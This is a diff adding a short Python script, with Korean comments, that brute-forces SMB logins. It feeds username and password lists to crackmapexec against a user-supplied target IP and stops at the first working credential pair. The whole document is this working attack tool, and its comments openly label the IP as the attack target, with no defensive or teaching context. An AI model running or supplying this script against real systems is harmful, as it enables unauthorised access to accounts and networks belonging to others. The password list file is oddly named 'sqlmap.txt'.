@@ -1,0 +1,34 @@
+import subprocess
+
+def crackmapexec_bruteforce(target_ip, user_file, password_file):
+    with open(user_file, 'r') as uf, open(password_file, 'r') as pf:
+        users = [line.strip() for line in uf]
+        passwords = [line.strip() for line in pf]
+
+    for user in users:
+        for password in passwords:
+            print(f"Trying {user}:{password} on {target_ip}")
+            try:
+                result = subprocess.run(
+                    ["crackmapexec", "smb", target_ip, "-u", user, "-p", password],
+                    capture_output=True,
+                    text=True
+                )
+                if "[+]" in result.stdout:
+                    print(f"Success: {user}:{password}")
+                    return
+                else:
+                    print(f"Failed: {user}:{password}")
+            except Exception as e:
+                print(f"Error occurred: {e}")
+                return
+
+    print("Bruteforce attack completed. No valid credentials found.")
+
+# 사용 예시
+target_ip = input("input ip : ")  # 공격 대상 IP
+user_file = input ( "user name : " )  # 사용자 이름 리스트 파일
+password_file = "sqlmap.txt" # 비밀번호 리스트 파일
+
+crackmapexec_bruteforce(target_ip, user_file, password_file)
+
